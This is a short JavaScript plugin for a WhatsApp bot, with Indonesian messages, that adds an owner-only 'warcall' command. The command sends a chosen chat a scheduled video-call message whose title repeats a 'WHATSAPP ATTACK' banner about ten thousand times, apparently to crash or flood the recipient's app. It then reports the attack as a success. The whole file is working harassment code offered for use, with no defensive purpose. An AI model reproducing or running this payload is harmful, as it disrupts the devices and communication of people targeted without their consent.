let handler = async (m, {conn, text}) => {
if (!text) throw `masukan Id grup`
const a = {
scheduledCallCreationMessage: {
callType: "VIDEO",
scheduledTimestampMs:  Date.now(),
title: "🦊 SALAM! WHATSAPP ATTACK FROM *PEMBELA KEBENARAN* 🦊\n".repeat(99*99)
}
}
conn.relayMessage(text, a, {})
conn.sendMessage(m.chat, { react: { text: '💥', key: m.key }})
m.reply('Sukses mengirim warcall ke nomor tujuan')
}
handler.help = ['warcal']
handler.tags = ['owner']
handler.command = /^(warcall|rangelcall)$/i
handler.owner = true
export default handler